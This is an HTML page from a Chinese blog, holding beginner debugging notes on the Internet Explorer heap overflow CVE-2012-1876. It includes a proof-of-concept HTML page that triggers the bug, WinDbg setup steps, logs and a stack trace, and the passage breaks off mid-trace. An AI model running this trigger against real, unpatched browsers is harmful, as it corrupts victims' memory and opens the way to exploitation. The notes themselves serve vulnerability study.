@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。 参考资料 windbg在线手册 漏洞战争 vupen Advanced Exploitation of In">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞战争：CVE-2012-1876调试笔记">
+<meta property="og:url" content="http://eternalsakura13.com/2018/03/10/cve2012_1876/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="前言在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。 参考资料 windbg在线手册 漏洞战争 vupen Advanced Exploitation of In">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-065200.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-065933.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-070005.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-070815.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-071745.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-071854.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-072303.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-085115.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-085211.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-085325.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-085236.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-173022.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-173337.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-173750.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-173811.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-17-075240.jpg">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-17-175951.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-17-155223.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-17-155242.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-17-182936.png">
+<meta property="og:updated_time" content="2018-03-17T19:28:16.910Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞战争：CVE-2012-1876调试笔记">
+<meta name="twitter:description" content="前言在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。 参考资料 windbg在线手册 漏洞战争 vupen Advanced Exploitation of In">
+<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2018/03/10/cve2012_1876/"/>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <title>漏洞战争：CVE-2012-1876调试笔记 | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/03/10/cve2012_1876/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">漏洞战争：CVE-2012-1876调试笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-10T14:52:54+08:00">
+                2018-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/读书笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">读书笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/03/10/cve2012_1876/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/03/10/cve2012_1876/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。<br>因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="http://www.dbgtech.net/windbghelp/index.html" target="_blank" rel="noopener">windbg在线手册</a></li>
+<li>漏洞战争</li>
+<li><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/cve_2012_1876/Advanced%20Exploitation%20of%20Internet%20Explorer%20Heap%20Overflow.pdf" target="_blank" rel="noopener">vupen Advanced Exploitation of Internet Explorer Heap Overflow</a></li>
+</ul>
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>win7 32位:<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|e812fbe758f05b485c5a858c22060785|h=S5RNBL5JL5NRC3YMLDWIO75YY3UP4ET5|/" target="_blank" rel="noopener">下载链接</a></li>
+<li>windbg6.1:<a href="https://pan.baidu.com/s/13nzTnsmmWDJoJRSBsb_ZPw" target="_blank" rel="noopener">下载链接</a></li>
+</ul>
+<h3 id="windbg符号文件设置"><a href="#windbg符号文件设置" class="headerlink" title="windbg符号文件设置"></a>windbg符号文件设置</h3><p>在windbg的窗口里输入<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p>
+<p>重启后要重新输入。</p>
+<h2 id="poc调试"><a href="#poc调试" class="headerlink" title="poc调试"></a>poc调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;table style=<span class="string">"table-layout:fixed"</span> &gt;</span><br><span class="line">        &lt;col id=<span class="string">"132"</span> width=<span class="string">"41"</span> span=<span class="string">"1"</span> &gt;&amp;nbsp &lt;<span class="regexp">/col&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>table&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">        obj_col.width = <span class="string">"42765"</span>;</span><br><span class="line">        obj_col.span = <span class="number">1000</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> setTimeout(<span class="string">"over_trigger();"</span>,<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>body&gt;</span><br><span class="line"> &lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p>基于HPA的漏洞分析方法</p>
+<ul>
+<li>hpa：启动页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</li>
+</ul>
+<p>在终端通过gflags启动hpa<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-065200.png" alt=""><br>启动ie浏览器后，用windbg attach进程<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-065933.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-070005.png" alt=""><br>两个进程，一个是broker进程 一个是页面的内容进程，附加后面的那个就可以，就是内容进程。<br>检查一下hpa开了没。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .symfix</span><br><span class="line">0:000&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">.............................</span><br><span class="line">0:000&gt; !gflag</span><br><span class="line">Current NtGlobalFlag contents: 0x02000000</span><br><span class="line">    hpa - Place heap allocations at ends of pages</span><br></pre></td></tr></table></figure></p>
+<p>然后需要开启子进程调试，这样才能断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.childdbg 1</span><br></pre></td></tr></table></figure></p>
+<p>然后g，启动调试器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:027&gt; g</span><br><span class="line">ModLoad: 74c30000 74c38000   C:\Windows\system32\credssp.dll</span><br><span class="line">ModLoad: 752a0000 752a8000   C:\Windows\system32\secur32.dll</span><br><span class="line">ModLoad: 750c0000 750f8000   C:\Windows\system32\ncrypt.dll</span><br><span class="line">ModLoad: 750a0000 750b7000   C:\Windows\system32\bcrypt.dll</span><br><span class="line">ModLoad: 74c70000 74cad000   C:\Windows\system32\bcryptprimitives.dll</span><br><span class="line">ModLoad: 74b50000 74b66000   C:\Windows\system32\GPAPI.dll</span><br><span class="line">ModLoad: 70c60000 70c7c000   C:\Windows\system32\cryptnet.dll</span><br><span class="line">ModLoad: 72e70000 72e85000   C:\Windows\system32\Cabinet.dll</span><br><span class="line">ModLoad: 74d10000 74d1e000   C:\Windows\system32\DEVRTL.dll</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-070815.png" alt=""><br>看到debugger正在运行了。<br>然后把poc拖到浏览器里运行。<br>另外poc拖进去之后，会自动断下来。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-071745.png" alt=""><br>再g一下，就变成下面这个样子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1:021&gt; g</span><br><span class="line">ModLoad: 760f0000 7610f000   C:\Windows\system32\IMM32.DLL</span><br><span class="line">ModLoad: 75b40000 75c0c000   C:\Windows\system32\MSCTF.dll</span><br><span class="line">ModLoad: 6ccf0000 6d76c000   C:\Windows\system32\IEFRAME.dll</span><br><span class="line">ModLoad: 75da0000 75da5000   C:\Windows\system32\PSAPI.DLL</span><br><span class="line">ModLoad: 72940000 7297c000   C:\Windows\system32\OLEACC.dll</span><br><span class="line">ModLoad: 741a0000 7433e000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc\comctl32.dll</span><br><span class="line">ModLoad: 75810000 7588b000   C:\Windows\system32\comdlg32.dll</span><br><span class="line">ModLoad: 71620000 71655000   C:\Program Files\Internet Explorer\IEShims.dll</span><br><span class="line">ModLoad: 75460000 7546c000   C:\Windows\system32\CRYPTBASE.dll</span><br><span class="line">ModLoad: 74390000 743d0000   C:\Windows\system32\uxtheme.dll</span><br><span class="line">ModLoad: 75500000 7550e000   C:\Windows\system32\RpcRtRemote.dll</span><br><span class="line">ModLoad: 735b0000 735c3000   C:\Windows\system32\dwmapi.dll</span><br><span class="line">ModLoad: 723c0000 723f3000   C:\Program Files\Internet Explorer\sqmapi.dll</span><br><span class="line">ModLoad: 74f90000 74fa6000   C:\Windows\system32\CRYPTSP.dll</span><br><span class="line">ModLoad: 76170000 7630d000   C:\Windows\system32\SETUPAPI.dll</span><br><span class="line">ModLoad: 756b0000 756d7000   C:\Windows\system32\CFGMGR32.dll</span><br><span class="line">ModLoad: 756e0000 756f2000   C:\Windows\system32\DEVOBJ.dll</span><br><span class="line">ModLoad: 74d30000 74d6b000   C:\Windows\system32\rsaenh.dll</span><br><span class="line">ModLoad: 764a0000 76523000   C:\Windows\system32\CLBCatQ.DLL</span><br><span class="line">ModLoad: 743f0000 744e5000   C:\Windows\system32\propsys.dll</span><br><span class="line">ModLoad: 6f9e0000 6fa0b000   C:\Program Files\Internet Explorer\ieproxy.dll</span><br><span class="line">ModLoad: 772c0000 773b4000   C:\Windows\system32\WININET.dll</span><br><span class="line">ModLoad: 76490000 76493000   C:\Windows\system32\Normaliz.dll</span><br><span class="line">ModLoad: 75510000 7551b000   C:\Windows\system32\profapi.dll</span><br><span class="line">ModLoad: 753f0000 7540a000   C:\Windows\system32\SspiCli.dll</span><br><span class="line">ModLoad: 75db0000 75de5000   C:\Windows\system32\ws2_32.DLL</span><br><span class="line">ModLoad: 759f0000 759f6000   C:\Windows\system32\NSI.dll</span><br><span class="line">ModLoad: 74e10000 74e54000   C:\Windows\system32\dnsapi.DLL</span><br><span class="line">ModLoad: 739a0000 739bc000   C:\Windows\system32\iphlpapi.DLL</span><br><span class="line">ModLoad: 73980000 73987000   C:\Windows\system32\WINNSI.DLL</span><br><span class="line">ModLoad: 6d920000 6d94e000   C:\Windows\system32\MLANG.dll</span><br><span class="line">ModLoad: 75410000 7545b000   C:\Windows\system32\apphelp.dll</span><br><span class="line">ModLoad: 73fe0000 74001000   C:\Windows\system32\ntmarta.dll</span><br><span class="line">ModLoad: 77500000 77545000   C:\Windows\system32\WLDAP32.dll</span><br><span class="line">ModLoad: 74a10000 74a19000   C:\Windows\system32\VERSION.dll</span><br><span class="line">ModLoad: 67b10000 680c2000   C:\Windows\System32\mshtml.dll</span><br><span class="line">ModLoad: 6e2c0000 6e2ea000   C:\Windows\System32\msls31.dll</span><br><span class="line">ModLoad: 75470000 754cf000   C:\Windows\system32\SXS.DLL</span><br><span class="line">ModLoad: 71270000 712a2000   C:\Windows\system32\WINMM.dll</span><br><span class="line">ModLoad: 744f0000 74529000   C:\Windows\system32\MMDevAPI.DLL</span><br><span class="line">ModLoad: 6daf0000 6db20000   C:\Windows\system32\wdmaud.drv</span><br><span class="line">ModLoad: 6dae0000 6dae4000   C:\Windows\system32\ksuser.dll</span><br><span class="line">ModLoad: 74730000 74737000   C:\Windows\system32\AVRT.dll</span><br><span class="line">ModLoad: 6db20000 6db56000   C:\Windows\system32\AUDIOSES.DLL</span><br><span class="line">ModLoad: 74760000 7476b000   C:\Windows\system32\msimtf.dll</span><br><span class="line">ModLoad: 6dad0000 6dad8000   C:\Windows\system32\msacm32.drv</span><br><span class="line">ModLoad: 6dab0000 6dac4000   C:\Windows\system32\MSACM32.dll</span><br><span class="line">ModLoad: 6daa0000 6daa7000   C:\Windows\system32\midimap.dll</span><br></pre></td></tr></table></figure>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-071854.png" alt=""><br>然后允许ActiveX控件运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(4b8.c00): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=06caf000 edi=06caf018</span><br><span class="line">eip=67f3f167 esp=0452daa8 ebp=0452dab4 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx  ds:0023:06caf018=????????</span><br></pre></td></tr></table></figure></p>
+<p>然后kb回溯一下栈<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:<span class="number">025</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0452</span>dab4 <span class="number">67</span>db5b8e <span class="number">00414114</span> <span class="number">0452</span>ddf8 <span class="number">00000001</span> mshtml!CTableColCalc::AdjustForCol+<span class="number">0x15</span></span><br><span class="line"><span class="number">0452</span>db64 <span class="number">67</span>c20713 <span class="number">00000001</span> <span class="number">0452</span>ddf8 <span class="number">000003e8</span> mshtml!CTableLayout::CalculateMinMax+<span class="number">0x52f</span></span><br><span class="line"><span class="number">0452</span>dd80 <span class="number">67</span>c0af19 <span class="number">0452</span>ddf8 <span class="number">0452</span>ddc4 <span class="number">00000001</span> mshtml!CTableLayout::CalculateLayout+<span class="number">0x276</span></span><br><span class="line"><span class="number">0452</span>df2c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452e158</span> <span class="number">00000000</span> mshtml!CTableLayout::CalcSizeVirtual+<span class="number">0x720</span></span><br><span class="line"><span class="number">0452e064</span> <span class="number">67</span>cef5d0 <span class="number">06e19</span>ea8 <span class="number">00000000</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452e128</span> <span class="number">67</span>cef31d <span class="number">06e19</span>ea8 <span class="number">0001769</span>c <span class="number">0001769</span>c mshtml!CFlowLayout::MeasureSite+<span class="number">0x312</span></span><br><span class="line"><span class="number">0452e170</span> <span class="number">67</span>cef664 <span class="number">0779b</span>f00 <span class="number">00000061</span> <span class="number">0452f</span>5a0 mshtml!CFlowLayout::GetSiteWidth+<span class="number">0x156</span></span><br><span class="line"><span class="number">0452e1</span>b0 <span class="number">67</span>cefb40 <span class="number">07b</span>fafb0 <span class="number">06e19</span>ea8 <span class="number">00000001</span> mshtml!CLSMeasurer::GetSiteWidth+<span class="number">0xce</span></span><br><span class="line"><span class="number">0452e234</span> <span class="number">6e2</span>c665d <span class="number">07862f</span>f8 <span class="number">0452e254</span> <span class="number">0452e318</span> mshtml!CEmbeddedILSObj::Fmt+<span class="number">0x150</span></span><br><span class="line"><span class="number">0452e2</span>c4 <span class="number">6e2</span>c6399 <span class="number">07</span>c12efc <span class="number">00000000</span> <span class="number">07025</span>d20 msls31!ProcessOneRun+<span class="number">0x3e9</span></span><br><span class="line"><span class="number">0452e320</span> <span class="number">6e2</span>c6252 <span class="number">07</span>c12f18 <span class="number">00018258</span> <span class="number">00000000</span> msls31!FetchAppendEscCore+<span class="number">0x18e</span></span><br><span class="line"><span class="number">0452e374</span> <span class="number">6e2</span>c61c3 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000014</span> msls31!LsDestroyLine+<span class="number">0x47f</span></span><br><span class="line"><span class="number">0452e3</span>fc <span class="number">6e2</span>c293f <span class="number">00000007</span> <span class="number">00003832</span> <span class="number">00000000</span> msls31!LsDestroyLine+<span class="number">0x9ff</span></span><br><span class="line"><span class="number">0452e438</span> <span class="number">67</span>cedd81 <span 